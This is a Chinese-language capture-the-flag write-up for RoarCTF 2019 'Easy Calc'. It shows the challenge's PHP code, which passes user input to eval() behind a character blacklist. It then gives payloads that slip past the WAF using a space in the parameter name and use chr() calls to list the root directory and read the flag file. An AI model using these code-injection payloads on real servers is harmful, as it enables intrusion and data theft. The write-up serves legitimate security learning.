### [RoarCTF 2019]Easy Calc

---

界面是一个行输入框，看一下代码

```html
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
```

访问calc.php

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

Payload:（存在空格）

```php
? num=1;phpinfo();
? num=1;var_dump(scandir(char(47)));
? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));
```



#### 细节处理：

如果我们正常传入想要正常传入绕过的时候发现，num只接受数学符号，

> PHP在解析param时候会先把空格去掉，加个空格即可绕过这个waf。之后只要绕过网站源码的过滤即可
>
> 现在的变量叫就是` num`，而不是`num`。
>
> 但php在解析的时候，会先把空格给去掉，代码还正常